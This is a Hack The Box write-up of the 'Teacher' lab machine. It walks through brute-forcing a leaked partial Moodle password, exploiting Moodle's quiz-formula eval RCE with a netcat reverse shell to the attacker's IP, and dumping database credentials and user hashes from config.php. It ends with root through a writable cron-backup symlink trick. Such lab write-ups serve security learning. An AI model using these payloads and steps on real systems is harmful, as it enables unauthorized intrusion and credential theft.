---
title: HTB - Teacher Write-up
author: bigb0ss
date: 2020-11-22 23:25:00 +0800
categories: [Hack The Box, Linux, Easy]
tags: [hackthebox, teacher, moodle RCE, cronjob]
image: /assets/img/post/htb/teacher/01_infocard.png
---

This one was an easy difficulty box. Good learning path for:
* Login Brute-forcing
* Moodle RCE - Math Formular Abuse
* MySQL DB Enum to Extract Password
* Privilege Escalation via Cronjob


# Initial Recon

## Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -p- -sC -sV 10.10.10.153

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool
```

### Interesting Ports to Note

* HTTP (80/TCP) - Web page for Blackhat High School. 

![image](/assets/img/post/htb/teacher/02.png)


## Image Enumeration

Within the homepage, there was another `.html` page at `http://10.10.10.153/gallery.html`. 

![image](/assets/img/post/htb/teacher/03.png)

When we inspect its source of the page, this seems interesting: 

```html
<img src="images/5.png" onerror="console.log('That\'s an F');" alt=""></a></li>
```

![image](/assets/img/post/htb/teacher/04.png)

When we browse the image `5.png`, it errors out; however, using `Burp` we can get a partial password in plain-text: `Th4C00lTheacha`

![image](/assets/img/post/htb/teacher/05.png)

![image](/assets/img/post/htb/teacher/06.png)

The user `Giovanni` is saying that she forgot the last character of her password. So the challenge may be that we need to find some type of login for the application and find the last character of ther password (probably bruteforcing the characters :]).


## Web Directory Enumeration (gobuster)

Next, we can enumerate the web application with `gobuster`. It found an interesting directory called `/moodle`.

```console
$ gobuster dir -u http://10.10.10.153/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.153/
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/22 21:16:33 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/moodle (Status: 301)
```

It was `moodle` learning management system application. (https://moodle.org)

![image](/assets/img/post/htb/teacher/07.png)


# Initial Foothold

## Moodle (Teacher App) Login Bruteforce

This app also has a login page. With the information we got it from the `5.png`, we can start bruteforce the last character of her (`Giovanni`) partial password. 

![image](/assets/img/post/htb/teacher/08.png)

We can capture the login with `Burp` and use the `Intruder` module to brutefoce the last character. We can use `a-z + A-Z + 0-9 + Special Chacters` for the bruteforce. 

![image](/assets/img/post/htb/teacher/09.png)

`Burp` found the `Th4C00lTheacha#` combo for different response length. And that was the password for the `giovanni` user.

![image](/assets/img/post/htb/teacher/10.png)

![image](/assets/img/post/htb/teacher/11.png)


## Moodle (Teacher App) RCE

Further Google search about this `moodle` application, we can find a public RCE exploit [here](https://blog.ripstech.com/2018/moodle-remote-code-execution/). Also [this video](https://www.youtube.com/watch?v=nXlOPoXW6NA) will show you the step-by-step how to exploit it. 

In a nutshell, an authenticated user (as assigned teacher role) can abuse the math formulas of the Quiz component to exectue RCE. It is possible because the function uses the PHP `eval()`, and it doesn't sanitize the user input properly. 

1) Go to `Site home` --> Click `Algebra` --> Click `Turn editting on`

![image](/assets/img/post/htb/teacher/12.png)

2) Click `Add an activity or resource` --> Click `Quiz` --> `Add`

![image](/assets/img/post/htb/teacher/13.png)

3) Create a new `Quiz`

![image](/assets/img/post/htb/teacher/14.png)

4) Click on the new `Quiz` --> Click `Edit` --> Click `a new questions`

![image](/assets/img/post/htb/teacher/15.png)

5) Click `Calculated` --> Click `Add`

![image](/assets/img/post/htb/teacher/16.png)

6) Using the POC code from the blog, let's complete creating the new `Quiz`

![image](/assets/img/post/htb/teacher/17.png)

This payload will execute a remote code using the parameter 'bigb0ss='. Using the following code, we can get a `nc` reverse shell onto our Kali box. 

```php
&bigb0ss=(nc -e /bin/bash 10.10.14.19 9001)
```

![image](/assets/img/post/htb/teacher/18.png)

Let's use the following one-liner to get a full `TTY` shell.

```console
python -c 'import pty;pty.spawn("/bin/bash")'

Ctrl+z

$ stty raw -echo
$ fg
```

# Privilege Escalation

## www-data --> giovanni (MySQL DB)

Further enumeration found that `root` password for moodle DB. 

```console
www-data@teacher:/var/www/html/moodle$ ls -la | grep config
-rw-r--r--  1 root root  45850 Jun 27  2018 config-dist.php.bak
-rw-r--r--  1 root root    728 Nov  3  2018 config.php
-rw-r--r--  1 root root    747 Nov  3  2018 config.php.save
www-data@teacher:/var/www/html/moodle$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);
```

Let's login to `mysql`:

```console
www-data@teacher:/var/www/html/moodle$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 397
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.01 sec)
```

Then, within `moodle` database --> `mdl_user` table, we can find MD5 password hash for `giovannibak`: `7a860966115182402ed06375cf0a22af`. 

```console
MariaDB [moodle]> select username, password from mdl_user;
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)
```

Using an online decryptor, we can recover the has in plain-text as `expelled`.

![image](/assets/img/post/htb/teacher/19.png)

<b>user.txt</b>

```console
www-data@teacher:/var/www/html/moodle$ su -l giovanni
Password: 
giovanni@teacher:~$ id    
uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)
giovanni@teacher:~$ cat user.txt 
fa9a ***REDACTED*** 8fa7
```

## giovanni --> root (cronjob)

Within the `gianvanni`'s home directory, there is a `/work` folder. We can see that `backup_course.tar.gz` is continuously being updated assuming there is some type of cronjob updating that file. 

```console
giovanni@teacher:~/work$ ls -lR
.:
total 8
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp

./courses:
total 4
drwxr-xr-x 2 root root 4096 Jun 27  2018 algebra

./courses/algebra:
total 4
-rw-r--r-- 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra

./tmp:
total 8
-rwxrwxrwx 1 root root  256 Nov 23 04:50 backup_courses.tar.gz    <----
drwxrwxrwx 3 root root 4096 Jun 27  2018 courses

./tmp/courses:
total 4
drwxrwxrwx 2 root root 4096 Jun 27  2018 algebra

./tmp/courses/algebra:
total 4
-rwxrwxrwx 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra
```

Backup script was found in the location at `/usr/bin/backup.sh`. 

```console
giovanni@teacher:~/work/tmp$ ls -la /usr/bin/backup.sh 
-rwxr-xr-x 1 root root 138 Jun 27  2018 /usr/bin/backup.sh
```

```bash
giovanni@teacher:~/work/tmp$ cat /usr/bin/backup.sh 
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

Some `tar` helper here:

```
-c: create a new archive
-z: filter the archive through gzip
-v: verbosely list files processed
-x: extract files from an archive
-f: use archive file or device ARCHIVE 
```

So the `backup.sh` script is owned by `root` and running the above script. Basically, it moves to `/tmp` and extract the `backup_courses.tar.gz` and `chmod` everything to `777` (= full permission). Let's remove the `courses/` directory and create a symlink to `/`.

```console
giovanni@teacher:~/work/tmp$ rm -rf courses/
giovanni@teacher:~/work/tmp$ ln -s / courses
```

<b>root.txt</b>

After the cronjob runs again, we will have a full `777` permission to `/` directory and read `root.txt` flag.

```console
giovanni@teacher:~/work/tmp$ cat /root/root.txt
4f3a ***REDACTED*** 1209
```

Thanks for reading!

